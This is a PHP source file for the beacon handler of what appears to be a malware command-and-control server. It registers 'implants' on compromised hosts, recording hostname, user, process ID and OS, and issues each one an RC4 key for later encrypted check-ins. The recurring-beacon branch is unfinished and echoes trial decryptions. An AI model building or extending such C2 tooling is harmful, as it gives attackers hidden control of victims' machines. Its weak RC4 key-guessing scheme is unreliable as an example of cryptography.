<?php
    include "connector.php";
    include "rc4.php";
    include "randomize.php";

    # Gets raw POST data
    $raw_post_data = file_get_contents("php://input");

    # If Base64 encoded POST data (initial beacon)
    if (base64_decode($raw_post_data, true) == true) {
        # Base64 decodes POST data
        $base64_decoded = base64_decode($raw_post_data);

        # Takes Base64 decoded POST data and splits based off "&"
        $ampersand_split = explode("&", $base64_decoded);

        # Parses and gets hostname
        $temp = explode("=", $ampersand_split[0]);
        $hostname = urldecode($temp[1]);

        # Parses and gets current user
        $temp = explode("=", $ampersand_split[1]);
        $current_user = urldecode($temp[1]);

        # Parses and gets process ID
        $temp = explode("=", $ampersand_split[2]);
        $process_id = urldecode($temp[1]);

        # Parses and gets operating system
        $temp = explode("=", $ampersand_split[3]);
        $operating_system = urldecode($temp[1]);

        # Generates 32 character (256 bit) encryption key here
        $encryption_key = generate_random_string();

        # Adds a new entry in the "implants" table
        $statement = $database_connection->prepare("INSERT INTO `implants` (`process_id`, `hostname`, `operating_system`, `current_user`, `encryption_key`, `last_seen`) VALUES (:process_id, :hostname, :operating_system, :current_user, :encryption_key, :last_seen)");
        $statement->bindValue(":process_id", $process_id);
        $statement->bindValue(":hostname", $hostname);
        $statement->bindValue(":operating_system", $operating_system);
        $statement->bindValue(":current_user", $current_user);
        $statement->bindValue(":encryption_key", $encryption_key);
        $statement->bindValue(":last_seen", gmdate("Y-m-d H:i:s"));
        $statement->execute();

        # Kills database connection
        $statement->connection = null;

        # Echoes out Base64 encoded encryption key to the HTTP response        
        echo base64_encode($encryption_key);
    }
    # Else RC4 encrypted POST data (recurring beacon)
    else {
        # Queries all encryption keys in the "implants" table
        $statement = $database_connection->prepare("SELECT `encryption_key` FROM `implants`");
        $statement->execute();
        $results = $statement->fetchAll();

        # Loops through each queried encryption key to determine if it can decrypt the POST data
        foreach ($results as $row) {
            $maybe_decrypted = rc4($row["encryption_key"], $raw_post_data);

            echo "Maybe Decrypted: " . $maybe_decrypted;

            # TO DO: After trying to decrypt, look for which one has the "nonce" POST parameter
            # If we see that "nonce" POST parameter, we know we have successful decryption
        }
    }
?>
